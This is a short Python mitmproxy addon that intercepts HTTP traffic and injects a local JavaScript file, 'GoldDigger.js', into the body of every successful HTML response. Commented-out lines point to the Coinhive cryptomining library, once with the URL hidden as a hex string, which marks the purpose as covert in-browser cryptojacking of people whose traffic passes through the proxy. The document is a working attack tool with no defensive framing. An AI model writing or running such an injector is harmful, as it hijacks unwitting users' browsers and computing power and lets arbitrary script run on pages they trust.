#!/usr/bin/env python3

from bs4 import BeautifulSoup
from mitmproxy import ctx

# Load in the javascript to inject.
with open('GoldDigger.js', 'r') as f:
    injected_javascript = f.read()

def response(flow):
    # Only process 200 responses of HTML content.
#    if flow.response.headers['Content-Type'] != 'text/html':
#        return
    if not flow.response.status_code == 200:
        return

    # Inject a script tag containing the JavaScript.
    html = BeautifulSoup(flow.response.text, 'lxml')
    #container = html.head or html.body
    container = html.body
    if container:
#        script = html.new_tag('script',src="68747470733A2F2F636F696E686976652E636F6D2F6C69622F636F696E686976652E6D696E2E6A73", type='text/javascript')
#        script = html.new_tag('script',src="https://coinhive.com/lib/coinhive.min.js", type='text/javascript')
#        script.string = injected_javascript
        script2 = html.new_tag('script', type = 'text/javascript')
        script2.string = injected_javascript
#        container.insert(0, script)
        container.insert(0, script2)
        flow.response.text = str(html)

        ctx.log.info('Successfully injected the `GoldDigger.js` script.')
